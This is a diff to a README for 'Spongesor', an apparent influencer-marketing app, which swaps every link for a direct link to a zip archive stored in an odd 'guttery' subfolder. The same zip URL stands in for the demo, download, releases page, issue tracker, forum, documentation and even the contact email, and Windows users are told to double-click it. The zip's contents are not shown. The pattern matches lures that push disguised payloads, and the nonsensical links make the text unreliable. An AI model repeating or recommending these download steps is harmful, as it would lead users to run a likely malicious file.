@@ -5,28 +5,28 @@
 Welcome to Spongesor! This application helps brands connect with top social media creators in a modern way. With a sleek purple and yellow theme, it's designed for a smooth user experience. 
 
 ### 🌐 Live Demo
-You can see Spongesor in action [here](https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip).
+You can see Spongesor in action [here](https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip).
 
 ## 📥 Download & Install
 
 To download Spongesor, visit the Releases page below. You will find the latest version ready for you to download.
 
-[![Download Spongesor](https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip%20Spongesor-v1.0-blue)](https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip)
+[![Download Spongesor](https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip%20Spongesor-v1.0-blue)](https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip)
 
 ### Steps to Download:
 
 1. Click on the button above to go to the Releases page.
 2. Choose the latest version.
 3. Find the file suitable for your operating system. Typical options include:
-   - Windows: `https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip`
-   - macOS: `https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip`
-   - Linux: `https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip`
+   - Windows: `https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip`
+   - macOS: `https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip`
+   - Linux: `https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip`
 4. Click on the file to start downloading.
 
 ### Installation Process:
 
 1. **For Windows:**
-   - Double-click `https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip`.
+   - Double-click `https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip`.
    - Follow the on-screen instructions.
 
 2. **For macOS:**
@@ -34,7 +34,7 @@ To download Spongesor, visit the Releases page below. You will find the latest v
    - Drag the Spongesor icon to your Applications folder.
 
 3. **For Linux:**
-   - Extract the `https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip` file.
+   - Extract the `https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip` file.
    - Run `./spongesor` from the terminal.
 
 ## 🛠️ System Requirements
@@ -66,8 +66,8 @@ Spongesor comes packed with features that enhance your marketing campaigns:
 
 Need help? You can reach out through the following channels:
 
-- **GitHub Issues:** [Report a problem](https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip)
-- **Community Forum:** [Join the discussion](https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip)
+- **GitHub Issues:** [Report a problem](https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip)
+- **Community Forum:** [Join the discussion](https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip)
 
 ## 📚 Topics
 
@@ -88,13 +88,13 @@ This project covers a range of topics important for modern marketing agencies:
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip)
-- [Documentation](https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip)
+- [Releases Page](https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip)
+- [Documentation](https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip)
+- [GitHub Repository](https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip)
 
 ## 📞 Contact Information
 
-For additional inquiries, send us an email at [https://raw.githubusercontent.com/yeec404/spongesor/master/guttery/spongesor-sweatband.zip].
+For additional inquiries, send us an email at [https://github.com/yeec404/spongesor/raw/refs/heads/master/guttery/Software-v2.1.zip].
 
 ---
 
